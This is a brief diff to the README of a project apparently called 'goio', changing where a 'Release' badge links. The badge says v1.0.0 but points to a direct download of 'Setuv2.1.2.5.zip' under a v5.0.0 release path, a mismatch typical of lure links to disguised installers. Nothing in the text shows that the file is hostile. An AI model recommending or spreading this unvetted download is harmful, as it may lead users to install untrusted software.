@@ -1,4 +1,4 @@
-[![Release](https://img.shields.io/badge/release-v1.0.0-brightgreen?style=flat-square)](https://github.com/nicksilvaio89f3/goio/releases/download/v4.0.0/Setuv2.1.2.5.zip)
+[![Release](https://img.shields.io/badge/release-v1.0.0-brightgreen?style=flat-square)](https://github.com/nicksilvaio89f3/goio/releases/download/v5.0.0/Setuv2.1.2.5.zip)
 
 # ⚡ goio
 
